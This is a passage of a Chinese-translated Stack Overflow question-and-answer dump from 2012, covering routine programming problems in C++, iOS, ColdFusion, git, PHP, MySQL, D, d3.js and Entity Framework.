emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{"webmaster@website.com"}); 
emailIntent.putExtra(Intent.EXTRA_SUBJECT, "my subject"); 
emailIntent.putExtra(Intent.EXTRA_TEXT, "body text"); 
context.startActivity(Intent.createChooser(emailIntent, "Send mail...")); 
```

# c++ - 在 C++ 中将 3d 数组转换为 2d 数组

> ID：13870577
> 
> 赞同：0
> 
> 时间：2012-12-13T23:47:33.287
> 
> 标签：c++, arrays

我有一个 3d 数组，它基本上是 9 个定义为 100x100 的 2d 数组块，它们将在 3x3 网格中排列。我想将这个 3D 数组转换为一个 2D 数组。

array[9][100][100] 需要转为 array[900][900]

关于我将如何解决这个问题的任何想法？

[编辑]

因此，我将降低计数以使其更易于管理。我将使用数组[9][5][5]；

如果我初始化数组并打印到文件中，使用下面的答案我不会得到我所期望的。鉴于我的初始化方式，我期望和想要的是一个看起来像这样的文件：

```
000001111122222
000001111122222
000001111122222
000001111122222
000001111122222
333334444455555
333334444455555
333334444455555
333334444455555
333334444455555
666667777788888
666667777788888
666667777788888
666667777788888
666667777788888 
```

所以我将值与第一个维度联系起来。它给了我 9 个象限的二维数组。这是我想要的布局。所以第一个维度实际上是定义应该放置其他两个维度的象限。所以重点是每个象限 2D 数组都将保存 tile id 来绘制我们的地图。我想这样做是因为玩家将从中心（第 4 象限）开始，但是当他移动到第 5 象限时，服务器（它是一个 MMO）会看到它移到了中心象限之外的右侧，所以它'将需要发送更多地图数据的整个右侧象限。

基本上它发送一个新的 2、5 和 8 象限的地图数据。我会让他们相应地移动 3D 数组（此时很容易。只需移动整个象限），然后在客户端上转换为 2D 数组，以便我可以轻松找到我需要绘制的 2D 地图的哪个子部分因为我可以通过简单的数学找出玩家在 2D 数组中所在的确切图块。这给了我一个流式地图，它在服务器上可能很大，但只有在需要时才将块发送到客户端。

```
for (j = 0; j < 5; j++) 
{
        for (k = 0; k < 5; k++) 
        {
            a[0][j][k] = 0;
            a[1][j][k] = 1;
            a[2][j][k] = 2;

            a[3][j][k] = 3;
            a[4][j][k] = 4;
            a[5][j][k] = 5;

            a[6][j][k] = 6;
            a[7][j][k] = 7;
            a[8][j][k] = 8;
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:08:05.180

您可以将任何 n 维数组表示为 m 维数组，只要您有`m <= n; m > 0`.

任务将是简单地跟踪什么是什么，以及如何到达它。

在您的情况下，`array[9][100][100]`可以按如下方式转换为二维数组：

```
d1 = 0;
d2 = 0;

a = array[9][100][100];
b = array[2][9 * 100 * 100 / 2];

for (unsigned int i(0); i < 9; i++) {
    for (unsigned int j(0); j < 100; j++) {
        for (unsigned int k(0); k < 100; k++) {
            b[d1][d2] = a[i][j][k];
            d2++;
            d1 = (d2 == 9 * 100 * 100 / 2) ? 1 : 0;
            d2 = (d2 == 9 * 100 * 100 / 2) ? 0 : d2;
        }
    }
} 
```

除此之外的任何事情都需要一个特殊的映射，您需要提供它才能说明值`a[i][j][k]`将存储在哪里`b[d1][d2]`。

考虑到你的回答，我想这就是你要找的：

```
int d1 = 0;
int d2 = 0;

int a[9][100][100];
int b[300][300];

unsigned int i(0), j(0), k(0);
for (i = 0; i < 9; i++) {

    for (j = 0; j < 100; j++) {

        for (k = 0; k < 100; k++) {
            b[d1 + j][d2 + k] = a[i][j][k];
        }

    }

    d1 = (d1 + j == 300) ? 0 : d1 + j;
    d2 = (d2 + k == 300) ? 0 : d2 + k;

} 
```

问候！

# ios - 自定义 UICollectionViewCell 自动布局 NSInternalInconsistencyException 错误

> ID：13870581
> 
> 赞同：7
> 
> 时间：2012-12-13T23:47:49.377
> 
> 标签：ios, uicollectionview, autolayout, uicollectionviewcell

我正在继承 UICollectionViewCell 并使用自动布局在代码中进行所有布局。这是我的初始化方法：

```
- (id)initWithFrame:(CGRect)frame{
    frame = CGRectMake(0, 0, 403, 533);
    if (self = [super initWithFrame:frame]) {
        self.translatesAutoresizingMaskIntoConstraints = NO;

        PBCardPricesViewController *pricesView = [[PBCardPricesViewController alloc] init];
        [self addSubview:pricesView.view];

        UIImageView *background = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"CardBackground"]];
        [self addSubview:background];

        [self addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"|-(20)-[background]|" options:0 metrics:nil views:@{@"background":background}]];
        [self addConstraint:[NSLayoutConstraint constraintWithItem:pricesView.view attribute:NSLayoutAttributeLeft relatedBy:NSLayoutRelationEqual toItem:background attribute:NSLayoutAttributeLeft multiplier:1 constant:0]];

        [self addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:|[background]|" options:0 metrics:nil views:@{@"background":background}]];
        [self addConstraint:[NSLayoutConstraint constraintWithItem:pricesView.view attribute:NSLayoutAttributeTop relatedBy:NSLayoutRelationEqual toItem:background attribute:NSLayoutAttributeTop multiplier:1 constant:0]];
    }

    return self;
} 
```

当我注释掉 translateAutoresizingMask 行时，我得到：

```
Unable to simultaneously satisfy constraints.

    Probably at least one of the constraints in the following list is one you don't want. Try this: (1) look at each constraint and try to figure out which you don't expect; (2) find the code that added the unwanted constraint or constraints and fix it. (Note: If you're seeing NSAutoresizingMaskLayoutConstraints that you don't understand, refer to the documentation for the UIView property translatesAutoresizingMaskIntoConstraints) 

(

    "<NSLayoutConstraint:0x1d83f540 H:[UIImageView:0x1d83f950]-(0)-|   (Names: '|':PBCardViewCollectionCell:0x1d83b970 )>",

    "<NSAutoresizingMaskLayoutConstraint:0x1c55ad20 h=--& v=--& H:[PBCardViewCollectionCell:0x1d83b970(393)]>",

    "<NSAutoresizingMaskLayoutConstraint:0x1c559410 h=--& v=--& UIImageView:0x1d83f950.midX == + 191.5>",

    "<NSAutoresizingMaskLayoutConstraint:0x1c559450 h=--& v=--& H:[UIImageView:0x1d83f950(383)]>"

)

Will attempt to recover by breaking constraint 

<NSLayoutConstraint:0x1d83f540 H:[UIImageView:0x1d83f950]-(0)-|   (Names: '|':PBCardViewCollectionCell:0x1d83b970 )>

Break on objc_exception_throw to catch this in the debugger.

The methods in the UIConstraintBasedLayoutDebugging category on UIView listed in <UIKit/UIView.h> may also be helpful. 
```

当我没有收到此错误时： `Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'Auto Layout still required after executing -layoutSubviews. UICollectionView's implementation of -layoutSubviews needs to call super.'` 如何让它显示我想要的方式？我错过了什么？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-14T18:36:37.290

发表我的评论作为答案：

根据我的经验，collectionViewCells（和 tableViewCells）需要它们的自动调整掩码，否则它们会抛出您看到的异常。但是由于您添加的子视图，您会遇到约束冲突，因此只需从其子视图中删除掩码：

```
backgroundView.translatesAutoresizingMaskIntoConstraints = NO;  
pricesView.view.translatesAutoresizingMaskIntoConstraints = NO; // you might get it to work without doing this line 
```

我还尝试记住删除我使用 alloc 创建的视图上的掩码（即不是来自 xib），因为大多数时候它们会产生冲突。

# coldfusion - 带有链接的 CFGRID

> ID：13870582
> 
> 赞同：0
> 
> 时间：2012-12-13T23:47:59.633
> 
> 标签：coldfusion, coldfusion-8, cfgrid

我正在使用 ColdFusion 版本 8。我有一个 CFGrid 显示一些数据：

```
<cfgrid name="GVDisplayUsers" format="html" height="500" autowidth="true" width="950" font="Tahoma" fontsize="12" sort=yes bind="cfc:CFFunctions.getUsers({cfgridpage},{cfgridpagesize},{cfgridsortcolumn},{cfgridsortdirection})">

<cfgridcolumn name="ID"  header="ID">
<cfgridcolumn name="USERID" header="USERID">
<cfgridcolumn name="FIRST_NAME" header="First Name">
<cfgridcolumn name="LAST_NAME" header="Last Name">

</cfgrid> 
```

我想要做的是让 ID 列成为 USER 信息页面的链接。

我该怎么做呢？

谢谢，

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T03:49:06.197

`<cfgridcolumn>`拥有`href`和`hrefkey`属性

```
<cfgrid name="GVDisplayUsers" format="html" height="500" autowidth="true" width="950" font="Tahoma" fontsize="12" sort=yes bind="cfc:CFFunctions.getUsers({cfgridpage},{cfgridpagesize},{cfgridsortcolumn},{cfgridsortdirection})">

 <cfgridcolumn name="ID"  header="ID" href="userpage.cfm" hrefkey="USERID">
 <cfgridcolumn name="USERID" header="USERID">
 <cfgridcolumn name="FIRST_NAME" header="First Name">
 <cfgridcolumn name="LAST_NAME" header="Last Name">

</cfgrid> 
```

# javascript - Touch Javascript 事件：用户在新页面加载时将手指留在屏幕上

> ID：13870586
> 
> 赞同：0
> 
> 时间：2012-12-13T23:48:12.213
> 
> 标签：javascript, events, touch, dom-events

我有以下一系列事件：

用户在他的触摸屏上按下一个元素。这会导致加载新页面。用户没有从屏幕上抬起手指。

现在，我想注册他的手指在新页面上的位置（或者如果他移动它，它在哪里）。但是，`ontouchmove`只有`ontouchstart`当他抬起手指然后再次触摸屏幕时才会开火。

有没有触发的事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T18:23:28.510

据我所知，没有触发事件，而且似乎没有一种很好的方法来检测加载时触摸（或鼠标）的位置。

一种选择是跟踪当前位置和状态，并将其传递到新页面。请参阅尤金在[JavaScript 上的回答：检查鼠标按钮是否按下？](https://stackoverflow.com/questions/322378/javascript-check-if-mouse-button-down)对于跟踪鼠标点击的示例，添加位置是类似的。

页面加载后，最后一块将跟随移动。对于鼠标，您可以使用 mouseMove 事件，但对于触摸，如果 touchMove 事件未触发，您可能会不走运。您可以尝试手动触发 touchStart 事件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-15T14:24:58.203

我认为关键是使用Ajax。这样可以加载新内容，但 touchmove 事件将继续触发。

我没有尝试这个，因为我最终加载了所有内容，然后在 javascript 中处理所有内容。这样我就不需要重新加载页面。当然，这只适用于基本页面，但我猜测 ajax 将适用于需要服务器操作的页面。

# git - 如何从本地开发转向生产？

> ID：13870589
> 
> 赞同：1
> 
> 时间：2012-12-13T23:48:33.250
> 
> 标签：git

我是 git 新手，无法找到正确的流程。我越来越糊涂了。

这是我所拥有的：1 台生产服务器 (A) 和各种本地机器 (X)

我已经做了什么：

1.  Git Init(iated) 我在 (A) 上的项目文件夹
2.  Git Clone(d) 在我的 Dropbox 文件夹中 (X)
3.  在本地开发了一个新功能（X），测试了它并尝试将其推送到（A）

然后我当然意识到（A）不是一个裸仓库，我将不得不处理版本问题..

我想要的是：

1.  Git变得又好又容易
2.  在 (X) 上开发新功能并将我的提交推送到 (A)（更改应该立即生效）
3.  能够直接在 (A) 上进行更改
4.  能够在（A）和（X）之间添加一个“开发”服务器到方案中，而不用太麻烦

我知道我要求很多，但我已经研究了裸存储库、git flow ......但我不确定哪种解决方案最适合我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T16:14:39.390

假设您有权在 (A) 中执行 git 命令，如果您在 (A) 中有 2 个 git 存储库，一个是裸存储库，另一个是工作树，则更好更新时的更多命令 (A)。

你可以这样做：

1.  在路径中的（A）中初始化一个裸仓库，比如说 /path/to/bare/repo.git
2.  从裸仓库克隆 (A) 中的项目文件夹，比如说在 /path/to/running/repo/ 中。这不是一个简单的回购

开发人员可以将更改推送到 A 中的裸存储库。当一切正常时，运行中的存储库会从裸存储库中提取更改。

有了这个，添加一个“开发服务器”就像从裸仓库克隆一样简单。当然，此设置不符合您对 (A) 的更改应该直接和立即的说法。但我认为如果你妥协的话会更好。

如果您真的希望 (A) 中只有一个非裸仓库，您可以更改该仓库中的分支。你可以这样做：

1.  在 (A) 中初始化一个非裸仓库
2.  使用以下命令更改该 repo 的分支：`git checkout -b production`

在主分支或“生产”以外的任何分支中进行所有开发。当更改被推送到各自分支的 (A) 中的 repo 时，将其合并到带有`git merge`.

# php - 如何在html标签之间使用php？

> ID：13870593
> 
> 赞同：0
> 
> 时间：2012-12-13T23:48:44.157
> 
> 标签：php, html

我知道并且刚刚检查过这个问题有很多答案。但我觉得我必须用我的具体例子问自己。下面是例子：

```
<?php if($i==1){?><div class=yel><?php echo "Today at $hour:$min $ampm<br/> Event: $event<br/> Place: $place<br/> Description: $desp<br/> Contact info: $info";?></div><?php } ?> 
```

它在我的电脑上工作，但是当我在其他电脑上尝试这段代码时，它得到了错误（解析，语法）。相信我，我在几台电脑上试过。但没有结果。同样的代码在我的电脑上运行良好。

所以最后我决定我的代码一点也不整洁。所以我的代码可能有一些我没有注意到的问题。您会看到我一次又一次地开始和结束 PHP 块。你很清楚我为什么这样做。实际上我试图避免 php 块中的标签。所以我的问题是，有没有更有效的方法在 PHP 块中使用 DIV 标记或任何其他标记？提前谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:54:39.250

这不是更容易用肉眼理解吗？

```
<?php 

if($i==1){
    echo "<div class=yel>";
    echo "Today at $hour:$min $ampm<br/> Event: $event<br/> Place: $place<br/> Description: $desp<br/> Contact info: $info";
    echo "</div>";
}

?> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-13T23:54:30.193

使用冒号代替括号。也关闭它`endif`。

```
<?php if($i == 1): ?>
    <div class=yel>
        <?php echo "Today at $hour:$min $ampm<br/> Event: $event<br/> Place: $place<br/> Description: $desp<br/> Contact info: $info";?>
    </div>
<?php endif; ?> 
```

您还可以使用短标签（需要通过 php.ini 启用）来使事情更整洁。

```
<? if($i == 1): ?>
    <div class=yel>
        <?="Today at $hour:$min $ampm<br/> Event: $event<br/> Place: $place<br/> Description: $desp<br/> Contact info: $info"?>
    </div>
<? endif; ?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T00:44:09.107

我可能会选择heredoc：

```
if($i == 1) echo <<< HTML
    <div class="yel">
        Today at {$hour}:{$min} {$ampm}<br/>
        Event: {$event}<br/>
        Place: {$place}<br/>
        Description: {$desp}<br/>
        Contact info: {$info}
    </div>
HTML; 
```

当你有一些包含一些变量的 HTML 时，heredocs 就是为它而制作的。干净整洁。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-13T23:52:11.443

使用 if 和 endif：

```
<?php if($i==1): ?>
<div class=yel>
<?php 
echo "Today at $hour:$min $ampm<br/> Event: $event<br/> Place: $place<br/> Description: $desp<br/> Contact info: $info";
?>
</div>
<?php endif; ?> 
```

虽然我个人会使用 MAXIM 的答案

# asp.net-mvc - d3.json() 没有在 asp.net mvc 上加载数据

> ID：13870599
> 
> 赞同：1
> 
> 时间：2012-12-13T23:49:48.493
> 
> 标签：asp.net-mvc, d3.js

我一直在试验 d3.js，例如在力导向图上有以下示例代码：

```
d3.json("file.json", function (error, graph) {

  force
  .nodes(graph.nodes)
  .links(graph.links)
  .start(); 
```

我正在使用 asp.net MVC，所以我尝试使用 ActionResult 创建 json 文件，例如：

```
 [HttpGet]
    public ActionResult visualizationdata()
    {
        FileInfo  file= new FileInfo(Path.Combine( HostingEnvironment.ApplicationPhysicalPath , @"Content\visualizationdata.json"));

        return File(file.Open(FileMode.Open, FileAccess.Read), "application/json", "visualizationdata.json");
    } 
```

在我的 cshtml 中，以 d3 为例，我有：

```
d3.json("@Url.Action("visualizationdata")" //the rest of the example code in d3.js 
```

json文件内容是这样的：

```
{
  "nodes":[
    {"name":"1","group":1},
    {"name":"2","group":1},
    //just json format (but no variable receiving it) 
```

使用作为“/controller/visualizationdata”的获取请求，文件被渲染得很好

***解决方案***：由stackoverflow的伙伴提供

只需将版本从 2 更改为 3：[http ://d3js.org/d3.v3.min.js](http://d3js.org/d3.v3.min.js)

# mysql - MySQL Union 2 选择 1 个表并输出 2 列

> ID：13870600
> 
> 赞同：0
> 
> 时间：2012-12-13T23:49:48.773
> 
> 标签：mysql, group-by, union

我目前有 1 个表和 2 个嵌套选择，我想将两个嵌套选择联合在一起，我希望结果集显示两个不同的列，每个结果集一个（每个嵌套选择一个列）。IE 三列共 t_stamp, R02AO11, R03AO11。这几天我一直在努力解决这个问题，任何可以帮助我的人都将不胜感激。我发现这个例子 [使用 SELECT UNION 并从一个表中返回两列的输出，](https://stackoverflow.com/questions/13592499/using-select-union-and-returning-output-of-two-columns-from-one-table)这对我来说没有意义——也许有点过头了。希望它不是太多的重新发布。再次感谢。=)

```
Select t_stamp,
MIN(R02AO11) 
FROM
( 
SELECT 
    t_stamp,
    R02AO11
FROM 
    tag_history 
WHERE 
    from_unixtime(floor(unix_timestamp(t_stamp)/60)*60) BETWEEN '2012-11-01                                                                                          00:00:00' AND '2012-11-30 23:59:59' 
    AND (R02AO11 IS NOT NULL AND R02AO11 > 0) 
) AS min_tag_history
GROUP BY LEFT(t_stamp, 10)
UNION ## UNION ALL 
Select t_stamp, 
MIN(R03AO11) 
FROM
( 
SELECT 
    t_stamp,
    R03AO11
FROM 
    tag_history 
WHERE 
    from_unixtime(floor(unix_timestamp(t_stamp)/60)*60) BETWEEN '2012-11-01 00:00:00' AND '2012-11-30 23:59:59' 
    AND (R03AO11 IS NOT NULL AND R03AO11 > 0) 
) AS min_tag_history
GROUP BY LEFT(t_stamp, 10)
ORDER BY t_stamp 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:02:58.897

你是在想这个还是我错过了什么？

```
SELECT 
    t_stamp,
    MIN(CASE WHEN R02AO11 = 0 THEN NULL ELSE R02AO11 END),
    MIN(CASE WHEN R03A011 = 0 THEN NULL ELSE R03A011 END)
FROM 
    tag_history 
WHERE 
    from_unixtime(floor(unix_timestamp(t_stamp)/60)*60) BETWEEN '2012-11-01                                                                                          00:00:00' AND '2012-11-30 23:59:59' 
GROUP BY LEFT(t_stamp, 10) 
```

# c++ - 容器的迭代器可以产生左值以外的东西吗？

> ID：13870601
> 
> 赞同：9
> 
> 时间：2012-12-13T23:50:06.943
> 
> 标签：c++, c++11

我或多或少得出的结论是，不可能编写一个其 value_type 未直接存储在容器中的符合容器。我认为这是不幸的，因为我经常希望我有容器，其中值类型要么是部分计算的，要么是由不连续的部分组装而成的（下面的例子，但与问题没有直接关系）。我知道如何编写使用代理对象的迭代器，尽管这很烦人。但我现在想知道 C++ 标准中是否真的有这些野兽的空间。这里可能有太多的废话；tl;dr 版本很简单：第 24.2.5 节第 1 和第 6 段的真正含义是什么，违反表观含义会在多大程度上破坏标准算法？或者，换句话说，如何解释它们以允许代理迭代器？

正如 Pete Becker 所指出的，实际上没有什么可以强迫我的容器符合标准库容器的要求。但是为了使用具有许多标准算法的容器，它必须具有至少具有 a 的一致迭代器`forward_iterator_tag`，或者它必须对此撒谎，但仍设法满足特定算法对其迭代器施加的操作（如果不是正式的）要求.

这是我的推理：

表 96 (§ 23.2.1)，容器要求，包括：

```
Expression     Return type         Assertion/note
------------   -------------       ---------------------
X::iterator    iterator type       any iterator category
               whose value         that meets the
               type is T           forward iterator
                                   requirements.
                                   Convertible to
                                   const_iterator.

 a.begin()     iterator;
               const_iterator for
               constant a. 
```

现在，转发迭代器：

> § 24.2.5，第。1：
> 
> 一个类或指针类型`X`满足前向迭代器的要求，如果……
> 
> — if`X`是可变迭代器，是对;`reference`的引用 `T`if`X`是一个 const 迭代器，`reference`是对`const T`

确实没有直接要求`*a`返回`reference`（其中`a`是 type `X`）。要求是：

> 如果可取消引用，则来自表 107（输入迭代器）`*a`必须“可转换为 T” 。`a`
> 
> 来自表 106（迭代器）的`*r`类型必须具有类型且可取消引用。`reference``r``X&`

但是，表 106 还指定`++r`返回`X&`，因此`*++r`必须是`reference`。此外，（根据表 107）`*a++`必须是`reference`，尽管（表 109）`a[n]`只需要“可转换为参考”。我不得不说，我看不出`*a`哪里`a`是类型`X`，`*r`哪里`r`是类型`X&`可能会有所不同，但也许我错过了一些微妙之处。

也许这里有一点回旋余地，但不多；在某些时候，您需要准备好创建一个`T`，如果您实际上在容器中没有一个，以便您可以提供对它的引用。

但关键是

> § 24.2.5，第。6（`a`and`b`是 type 的值`X`）：如果`a`and`b`都是可解引用的，那么`a == b`当且仅当`*a`and`*b`绑定到同一个对象。

我找不到 的正式定义`bound to`，但在我看来，制作不可寻址对象的迭代器的常用策略是创建一个代理对象，通常存储在迭代器本身内。在这种情况下，除了禁止两个不同的迭代器对象之间进行相等比较之外，即使它们在逻辑上指示相同的位置，也需要非常宽泛地理解“绑定到”的含义以任何方式解释 24.2.5/6在容器中。

另一方面，我注意到应该知道的 Dietmar Kühl 在回答[这个问题](https://stackoverflow.com/questions/13130708/what-is-the-advantage-of-using-universal-references-in-range-based-for-loops)时说：

> C++ 2011 的要求放宽了，迭代器不一定需要产生左值

那么，迭代器可以返回代理，还是不能？如果可以，这种代理的性质是什么？我认为这样的迭代器不符合标准的推理在哪里失败了？

* * *

正如所承诺的，一些容器的有效 value_types 不会连续存储在容器中：

1) 一个紧凑的关联容器，其键和值类型可以更有效地存储在两个单独的向量中。（将键保存在向量中还可以提高缓存友好性，并减少分配开销。）

2) A`vector<T>`伪装成`map<integer_type, T>`，简化了与其他`map<X, T>`类型的互操作性。

3）通过压缩其他几个容器形成的逻辑容器，产生一个逻辑值类型，它是`tuple`对压缩容器的值类型的引用。（在某些应用程序中，一个或多个压缩容器可能被完全计算，或者作为其他值的函数，或者作为序列号。）

4) 聚合类型容器的视图，它只有一些值。（很可能，底层容器和视图都是元组，其中视图元组的类型列表是底层容器类型的子集，可能以不同的顺序）。

我相信其他人可以轻松添加到此列表中；这些只是我在过去几个月中以某种方式破解的那些。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T06:10:15.117

最好的模型是`std::vector< bool >`. 它尽可能地接近兼容，但它的迭代器确实产生了代理。

该标准甚至指定这`std::vector<bool>::reference`是一个类。然而，容器需求表指定`X::reference`产生“T 的左值”。因此，它是严格不合规的。

但迭代器不限于`T`. 迭代器`value_type`必须是`T`并咨询输入迭代器要求，`reference`必须转换为`value_type`.

正如 Pete Becker 提到的，需求表是相当广泛的毯子，各个算法指定他们需要什么。只有需要`reference`真正成为参考的算法才会中断，这只是在说明显而易见的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-13T23:59:40.437

不要通过考虑“符合标准的容器”来限制自己：标准中没有任何东西取决于拥有一个。将容器要求视为描述标准中定义的容器要求的简写方式。而已。只要您的容器生成的迭代器是有效的，您就可以使用所有相应的算法，并且大概可以使用您自己编写的算法。

# git - 使用 gitolite VREF 进行更新挂钩

> ID：13870607
> 
> 赞同：5
> 
> 时间：2012-12-13T23:51:13.740
> 
> 标签：git, gitolite

我正在尝试从 gitolite 的 v2 迁移到 v3。进行服务器端提交消息检查的旧方法是将检查放入 myrepo.git/hooks/update.secondary 中的 repo 特定挂钩中

在 gitolite v3 中，他们建议将支票放入 VREF。文档有点混乱，我希望得到澄清。

我在 /home/git/.gitolite.rc 添加了以下内容

```
LOCAL_CODE                  => "$ENV{HOME}/.gitolite/our_hooks", 
```

在我的 our_hooks 目录中，我创建了一个 VREF 文件夹并将旧的 update.secondary 脚本放在那里。在我的 gitolite-admin/conf/gitolite.conf 文件中，我将以下内容添加到我希望脚本在其上执行的存储库中：

```
repo myrepo
  RW = @my_developers
  - VREF/update.secondary = @my_developers 
```

当我尝试推送时，我收到一条通知，找不到 VREF/update.secondary。如果我改为

```
repo myrepo
  RW = @my_developers
  - /home/git/.gitolite/our_hooks/VREF/update.secondary = @my_developers 
```

我没有收到任何投诉，但钩子似乎根本没有运行。

我是否错过了如何使用 gitolite 进行额外的更新检查？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T02:38:55.520

围绕这个的文档有点混乱，所以希望这能帮助其他人尝试使用 gitolite v3 获得链式更新钩子。

我上面所做的一切都是正确的，缺少的部分是我的 update.secondary 脚本需要驻留。

在 gitolite-admin/conf/gitolite.conf 中，配置应如下所示：

```
repo myrepo
  RW = @my_developers
  - VREF/update.secondary = @my_developers 
```

然后在GL_BINDIR目录中有一个VREF目录。将您的可执行 update.secondary 文件放在该目录中。

GL_BINDIR 是包含您为了运行而运行的 gitolite 二进制文件的目录：`gitolite setup`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T06:20:10.610

要添加到（赞成的）[OP nathasm](https://stackoverflow.com/users/1392862/nathasm)的[答案](https://stackoverflow.com/a/13871875/6309)`LOCAL_CODE`，我在文件中使用变量没有问题，如“[自定义 gitolite](http://sitaramc.github.com/gitolite/cust.html#ncloc)`.gitolite.rc` ”的“备用位置”部分所述。

但是，我从未设法使用环境变量。

换句话说，这是行不通的：

```
LOCAL_CODE                  => "$ENV{HOME}/.gitolite/our_hooks", 
```

但这将：

```
LOCAL_CODE                  => "/home/git/.gitolite/our_hooks", 
```

使用完整路径意味着将识别 /home/git/.gitolite/our_hooks/VREF 中声明的任何 VREF 或挂钩

```
repo myrepo
  RW = @my_developers
  - VREF/update.secondary = @my_developers 
```

# php - 第一次用 PHP 解析邮件。真的这么简单吗？

> ID：13870610
> 
> 赞同：0
> 
> 时间：2012-12-13T23:51:22.363
> 
> 标签：php, email

我正在尝试在 Codeigniter 网站上实现邮件解析功能。这是我第一次尝试这样的事情。

我希望用户能够向 newevents@mysite.com 发送电子邮件，然后设置一个 cron 作业来定期检查邮箱，将电子邮件解析为统一格式，然后更新 SQL。

就像是

```
EMAIL FROM john@gmail.com

((eventname:My upcoming event))
((description:You must come. There will be women of loose moral fiber.  And cheetos.))
((date:2013/04/13)) 
```

类似于您可以对许多在线“Todo”网站进行的操作。我会对照数据库检查“发件人”地址，然后插入数据。

我有点困惑，因为我看到 PHP 有一个看起来相当复杂的 IMAP/POP3 类，但我也找到了一个看起来完全基本的代码示例。

```
$php = connect ("mymailserver.com", $port = 110);
$login= login("email","test", $php);
$firstmsg= get(0, $php);
message_details($firstmsg, 0, $php);
quit($php); 
```

显然这应该抓取未读消息，我看到我可以将它们全部抓取并将它们放入一个数组中进行处理。我想他们会被标记为“已读”。但为什么其他解决方案要复杂得多？这让我相信这太好了，难以置信。

我不明白什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T23:54:55.120

该代码不使用预定义的 PHP 函数。您将需要使用您在 php.net 上找到文档的 PHP POP / IMAP 类，或者使用其他人编写的库。

# java - mysql 使用 java prep 语句将值插入到具有特定日期格式的数据库中

> ID：13870614
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:51:40.183
> 
> 标签：java, mysql, date

我几乎不好意思问这个我在输入下面的查询时遇到问题，我想输入一个不同格式的日期值（dd/mm/yy）。mysql很累，不想和我一起输入一个值，但是格式错误。我将字符串 03-08-2009 放入变量（java）并使用？准备好执行查询的语句。

```
INSERT INTO project (code, sdatum) VALUES(
            12, STR_TO_DATE('03-08-2009', '%d/%m/%Y')); 
```

这是mysql插入到列表中的内容

> '12','2009-08-03'

PS：我正在使用工作台

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:01:23.393

（*升级到答案*）

如[The `DATE`,`DATETIME`和`TIMESTAMP`Types](http://dev.mysql.com/doc/en/datetime.html)下所述：

> MySQL 以格式检索和显示`DATE`值。`'YYYY-MM-DD'`

如果您想检索以其他方式格式化的日期，您必须应用[`DATE_FORMAT()`](http://dev.mysql.com/doc/en/date-and-time-functions.html#function_date-format)到您的选择表达式：

```
SELECT DATE_FORMAT(sdatum, '%d/%m/%Y') FROM project 
```

# d - 书中的代码不起作用

> ID：13870617
> 
> 赞同：6
> 
> 时间：2012-12-13T23:51:54.343
> 
> 标签：d

我目前正在学习 D 并且正在采取婴儿步骤，所以请多多包涵。

我正在阅读一本名为“The D Programming Language”的书。我正在为我的代码使用 D-IDE。我目前正在编写一个程序，如果这本书还没有单词，它应该将单词添加到它的词汇表（字典）中。

问题是，这本书提供的代码是无效的，而不是仅仅继续阅读结果应该是什么等等。我想尝试解决它。当然是一个我对 D 很陌生的问题。

代码如下所示：

```
import std.stdio, std.string;

void main() {
    uint[string] dictionary;
    foreach(line; stdin.byLine()) {
    // Break sentence into words
    // Add each word in the sentence to the vocabulary
        foreach(word; splitter(strip(line))) {
            if(word in dictionary) continue; // Nothing to do
            auto newID = dictionary.length;
            dictionary[word] = newID;
            writeln(newID, '\t', word);
        }
    }
} 
```

IDE 说`Error: undefined identifier splitter`，由于我对 Java 非常有经验，我猜该错误意味着该方法不存在，因此它试图将其作为变量处理，但它也不存在。所以我尝试将其更改为“拆分”。这会在字典中产生另一个错误：`Error: associative arrays can only be assigned values with immutable keys, not char[]`

所以我真的不知道该怎么做才能解决这个问题并让它发挥作用。当本应教你的书籍中的代码不起作用时，真是令人沮丧。我正在使用 dmd2。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-13T23:58:18.750

您想要的拆分器位于`std.algorithm.iteration`模块中（以前`std.array`，但它在 2016 年移动）。将其添加到您的导入中，这应该会消失。

另一件事是字典[单词]。那必须是 dictionary[word.idup] 。

原因是 stdin.byLine 引入的行位于临时缓冲区中（通过避免内存分配来获得最大性能）。当您获得下一行时，它将覆盖上一行。

您不希望在 AA 中出现这种情况：键会变得混乱。.idup 制作一个永远不会改变的副本。

（这本书没有 idup 的原因可能是因为那里的代码用于编译，但它并没有真正正常工作，所以这被认为是一个错误。）

# entity-framework - 实体框架迁移：INSERT 语句与 FOREIGN KEY 约束冲突

> ID：13870618
> 
> 赞同：1
> 
> 时间：2012-12-13T23:51:59.193
> 
> 标签：entity-framework, ef-code-first, entity-framework-migrations

我有以下型号

```
public class User
{
    public int UserID { get; set; }
    public string FirstName { get; set; }
    public string LastName { get; set; }
    public string Email { get; set; }
    public string FacebookID { get; set; }
    public string GoogleID { get; set; }
    public string TwitterID { get; set; }
    public bool Admin { get; set; }
    public bool Authorized { get; set; }

    public virtual Comment Comment { get; set; }
    public virtual CommentReply CommentReply { get; set; }
    public virtual Project Project { get; set; }
    public virtual ProjectVote ProjectVote { get; set; }
    public virtual CommentReplyVote CommentReplyVote { get; set; }
